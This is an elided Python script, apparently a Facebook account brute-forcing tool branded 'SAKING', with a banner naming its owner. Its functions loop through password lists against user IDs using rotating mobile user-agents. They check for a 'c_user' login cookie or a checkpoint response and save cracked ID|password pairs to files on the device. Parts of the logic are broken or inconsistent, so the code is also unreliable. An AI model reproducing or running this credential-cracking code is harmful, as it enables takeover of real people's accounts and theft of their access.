...
`8888Y' YP   YP YP   YD Y888888P VP   V8P  Y888P  pro🤞
                                                  
                                                                 

\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : AFGHAN ASKING 
\033[97;1m>>     Facebook : AFGHAN SA PRINCE 
\033[97;1m>>     Version  : 0.1
\033[97;1m>>     Git hop  : SAKING101
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SAKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[SAKING-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/SAKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SAKING:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SAKING-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SAKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SAKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[SAKING-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[SAKING-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SAKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mSAKING\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[SAKING-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[SAKING-OK] '+uid+' | '+ps+'\33[0;97m')
